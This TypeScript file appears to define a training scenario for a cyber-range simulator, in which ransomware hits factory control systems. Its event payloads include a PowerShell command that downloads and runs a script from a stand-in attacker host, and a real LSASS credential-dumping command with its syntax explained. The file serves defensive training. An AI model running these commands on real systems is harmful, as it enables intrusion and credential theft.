/**
 * ransomware.ts
 *
 * Industrial OT Ransomware Attack Scenario definition (LOCKOUT).
 */

import type { AttackScenario } from "./types";
import { DEFAULT_NODES, EDGES, DEFAULT_DECISIONS } from "@/data/scenarios";

export const RANSOMWARE_SCENARIO: AttackScenario = {
  id: "ransomware",
  sector: "manufacturing",
  name: "LOCKOUT",
  code: "LOCKOUT",
  site: "Smart Factory · Sector 4",
  byline:
    "OT network encrypted. Historian databases locked. Custom ransomware targeting Siemens & Rockwell project files.",
  adversary: "BLACKOUT-RAID",
  protocols: "SMB · RDP · OPC-UA · EtherNet/IP",
  description:
    "Targeted double-extortion OT ransomware campaign encrypting SCADA project databases, HMI runtime files, and PLC configurations.",
  duration: 9600,
  severity: "CRITICAL",
  mitreMapping: ["T0865", "T0886", "T0836", "T0855", "T0828"],
  nodes: DEFAULT_NODES.map((n) => ({ ...n })),
  edges: EDGES.map((e) => ({ ...e })),
  decisions: DEFAULT_DECISIONS.map((d) => ({ ...d })),
  events: [
    {
      id: "r-0",
      time: 0,
      type: "network.node",
      tag: "INITIAL ACCESS",
      node: "ews-04",
      title: "Malicious macro executed",
      desc: "Workstation EWS-04 compromised via phishing payload. PsExec used to spread across local subnet.",
      sev: "HIGH",
      lifecycleState: "Initial Access",
      payload: {
        command:
          "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://bad.actor/lock.ps1')\"",
        output: "[+] Cobalt Strike Beacon loaded. Ransomware stager initialized on EWS-04.",
        logEntry: {
          level: "CRITICAL",
          source: "EWS-04",
          message: "SUSPICIOUS POWERSET EXECUTION: DownloadString stager detected.",
        },
      },
    },
    {
      id: "r-1",
      time: 1100,
      type: "network.node",
      tag: "CREDENTIAL DUMP",
      node: "hist",
      title: "LSASS memory dumped",
      desc: "Historian administrative credentials harvested. Domain admin hashes retrieved.",
      sev: "CRITICAL",
      lifecycleState: "Credential Access",
      payload: {
        command: "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 lsass.dmp full",
        output: "[+] LSASS dump saved to C:\\windows\\temp\\lsass.dmp. 12 hashes extracted.",
        logEntry: {
          level: "CRITICAL",
          source: "HIST-PI",
          message: "LSASS MEMORY DUMP DETECTED from remote process.",
        },
      },
    },
    {
      id: "r-2",
      time: 3200,
      type: "network.node",
      tag: "ENCRYPTION",
      node: "hmi-11",
      title: "SCADA runtime databases encrypted",
      desc: "Wonderware InTouch project files encrypted with ChaCha20 extension .LOCKOUT.",
      sev: "CRITICAL",
      lifecycleState: "Impact",
      payload: {
        command: "lockout.exe --path C:\\Wonderware\\Projects --key 0x89A... --extension .LOCKOUT",
        output:
          "[!] Encrypted 4,892 files in C:\\Wonderware\\Projects. Ransom note dropped: READ_ME_LOCK.txt",
        logEntry: {
          level: "CRITICAL",
          source: "HMI-11",
          message:
            "MASS FILE ENCRYPTION IN PROGRESS: 4,892 files appended with .LOCKOUT extension.",
        },
        popupHint: {
          title: "OT RANSOMWARE ENCRYPTION",
          text: "SCADA HMI project files are being encrypted! Isolate nodes immediately.",
          nodeId: "hmi-11",
        },
      },
    },
    {
      id: "r-3",
      time: 6800,
      type: "network.node",
      tag: "PLC LOCKOUT",
      node: "plc-3",
      title: "PLC password protection set",
      desc: "Siemens S7 CPU protection set to Level 3. OEM maintenance keys overwritten.",
      sev: "CRITICAL",
      lifecycleState: "Impact",
      payload: {
        command: 's7-lock --ip 192.168.30.60 --set-pwd "Rans0m_L0cked_2026!"',
        output:
          "[!] PLC-3 CPU Access Level set to 3 (PASSWORD READ/WRITE PROTECTED). OEM key locked.",
        logEntry: {
          level: "CRITICAL",
          source: "PLC-3",
          message: "PLC ACCESS LEVEL CHANGED TO LOCKED. Password protection enabled.",
        },
      },
    },
  ],
  briefing: {
    overview: {
      title: "EXERCISE LOCKOUT · OT DOUBLE-EXTORTION RANSOMWARE",
      summary:
        "Adversary BLACKOUT-RAID deployed custom OT ransomware across Sector 4 Smart Factory. The malware is actively encrypting Wonderware HMI runtime files, locking Siemens S7 PLCs with custom passwords, and exfiltrating engineering blueprints. Your goal is to isolate affected subnets, preserve offline backups, and patch firmware before factory operations are permanently paralyzed.",
      targetInfrastructure: "Smart Factory Manufacturing Line (Sector 4)",
      threatActor: "BLACKOUT-RAID (OT Ransomware Syndicate)",
      businessImpact:
        "Total factory shutdown costing $250,000 per hour of downtime, risk of permanent PLC lockout requiring physical replacement.",
    },
    learningObjectives: [
      "Detect lateral ransomware movement across IT/OT boundaries.",
      "Contain file encryption using network segmentation and air-gaps.",
      "Understand PLC password protection lockouts and mitigation strategies.",
    ],
    scope: {
      included: [
        "✔ LSASS Memory Dumping",
        "✔ SMB/RDP Ransomware Spreading",
        "✔ SCADA Project Encryption",
        "✔ PLC Password Lockout",
      ],
      excluded: ["✖ Paying cryptocurrency ransom", "✖ Cryptographic decryption key cracking"],
    },
    attackIntent: {
      narrative: "BLACKOUT-RAID aims to paralyze production lines and demand a 150 BTC ransom.",
      attackerGoals: [
        "Harvest domain admin credentials.",
        "Encrypt SCADA project databases.",
        "Lock Siemens PLC access levels.",
        "Force factory shutdown.",
      ],
    },
    infrastructure: [
      { assetName: "EWS-04", role: "Workstation", purdueLevel: "Level 4", nodeId: "ews-04" },
      { assetName: "HIST-PI", role: "Historian", purdueLevel: "Level 3.5", nodeId: "hist" },
      { assetName: "HMI-11", role: "Console", purdueLevel: "Level 2", nodeId: "hmi-11" },
      { assetName: "PLC-3", role: "Controller", purdueLevel: "Level 1", nodeId: "plc-3" },
    ],
    mitreOverview: [
      {
        id: "mr1",
        name: "Credential Access",
        techniqueId: "T1003",
        techniqueName: "OS Credential Dumping",
        description: "LSASS dump on historian.",
        sequenceOrder: 1,
      },
      {
        id: "mr2",
        name: "Impact",
        techniqueId: "T1486",
        techniqueName: "Data Encrypted for Impact",
        description: "Encrypt SCADA project files.",
        sequenceOrder: 2,
      },
    ],
    controls: [{ name: "Play / Pause", description: "Control simulation timing." }],
    guidedHints: [
      {
        triggerEventId: "r-2",
        hintText:
          "Mass encryption detected on HMI-11. Use 'isolate hmi-11' in Kali CLI immediately!",
      },
    ],
    helpContent: {
      idleSuggestionText:
        "Ransomware spreads via open network shares. Isolate infected nodes to stop propagation.",
      commonFAQ: [
        {
          question: "Can I unlock the PLC?",
          answer:
            "Apply a signed patch using 'patch plc-3' in Kali CLI to reset CPU security levels.",
        },
      ],
    },
    commandExplanations: [
      {
        command: "rundll32.exe comsvcs.dll, MiniDump lsass.dmp",
        purpose: "Dumps LSASS memory to extract cleartext passwords and hashes.",
        syntax: "rundll32 comsvcs.dll MiniDump <pid> <output>",
        expectedOutput: "LSASS dump saved.",
        attackerIntent: "Harvest administrative credentials.",
        riskLevel: "CRITICAL",
        detectionOpportunities: "EDR alert on comsvcs.dll loading LSASS process.",
        mitreTechnique: "T1003 - Credential Dumping",
      },
    ],
    nodeExplanations: {},
    timelineExplanations: [],
    successCriteria: [
      "Halt ransomware propagation before reaching Level 1 controllers.",
      "Maintain factory operations.",
    ],
  },
};
